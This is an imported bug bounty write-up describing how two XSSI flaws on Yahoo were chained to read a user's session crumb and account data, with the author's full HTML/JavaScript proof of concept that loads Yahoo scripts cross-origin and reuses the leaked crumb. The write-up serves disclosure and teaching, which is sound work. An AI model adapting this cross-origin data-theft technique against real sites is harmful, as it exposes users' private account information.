---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-07-29_yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty.md
original_filename: 2018-07-29_yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty.md
title: Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty)
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
language: en
raw_sha256: da93b34c3a3f7359f87ba0461eab0896e8dcb885757bc61e76d490425cbe40ce
text_sha256: fbe24465bf2a577f224b308cec7d1f8da4114587c0a0ef03c734116a8f8ddaa6
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-07-29_yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `da93b34c3a3f7359f87ba0461eab0896e8dcb885757bc61e76d490425cbe40ce`
- Text SHA256: `fbe24465bf2a577f224b308cec7d1f8da4114587c0a0ef03c734116a8f8ddaa6`


## Content

---
title: "Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty)"
page_title: "Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty) | by hyde | Medium"
url: "https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a"
authors: ["Brian Hyde (@0xHyde)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["XSSI"]
bounty: "750"
publication_date: "2018-07-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5784
scraped_via: "browseros"
---

# Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty)

Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty)
hyde
Follow
3 min read
·
Jul 30, 2018

404

1

While intercepting requests using Burp Suite I noticed the following request:

Press enter or click to view image in full size

When I saw that this was a JSONP endpoint I immediately knew this could potentially be an XSSi vulnerability. However, I noticed that if the value for the .crumb GET parameter wasn’t valid it would return the following response:

Press enter or click to view image in full size

At this point I realized that if I could somehow steal the victims valid .crumb value, I could successfully steal information about their account. I then searched all requests I intercepted in Burp Suite for my valid crumb and I quickly found it in in a dynamic Javascript file located at: https://messenger.yahoo.com/embed/app.js

Get hyde’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

If you go to this page now you will not find the logoutCrumb value since they have patched this issue. However, when I initially discovered this issue the file looked like this:

Press enter or click to view image in full size

Now, for people that don’t understand how XSSi works the vulnerability essentially takes advantage of Same-Origin Policy (SOP) not being applied to Javascript src attribute within the script tag. I then created the following Proof of Concept which steals the valid .crumb value from the dynamic Javascript file at https://messenger.yahoo.com/embed/app.js and then places the valid crumb in the .crumb GET parameter as seen here https://jsapi.login.yahoo.com/w/device_users?.crumb=POR1.kRjsx. which returns a proper response containing information about the user. Using the code below I was able to extract information:

<html>
  <head>
  <title>Yahoo XSSi PoC</title>
  </head>
  <body>  
  <div style="width: 60%; margin-right: auto; margin-left: auto; margin-bottom: 30px;">
  <h1 style="text-align: center;">Proof of Concept</h1>
  <b>Dataset 1:</b>
  <div id="content1" style="width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;"></div>
  <br/>
  <b>Dataset 2:</b>
  <div id="content2" style="width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;"></div>
  </div>
  <script>
  function processDeviceUsers(data) { 
  document.getElementById("content1").innerHTML = JSON.stringify(data);
  }
  window.onload = function () {
  var config = {};
  config_data = {};
  config.merge = function(data) { config_data = data };
  iris.initConfig(config);
  document.getElementById("content2").innerHTML =  JSON.stringify(config_data); 
  var src = "https://jsapi.login.yahoo.com/w/device_users?.crumb=" + config_data.session.logoutCrumb;
  var s = document.createElement('script');
  s.setAttribute('src', src);
  document.body.appendChild(s);
  }  
  </script>
  <script src="https://messenger.yahoo.com/embed/app.js"></script>
  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
  </body>
</html>

Below is a screenshot of the payload I submitted to Yahoo and received a $750 bug bounty. Overall, I had a great time developing the Proof of Concept for this vulnerability chain and I hope others are able to learn a thing or two from this write up.

Press enter or click to view image in full size
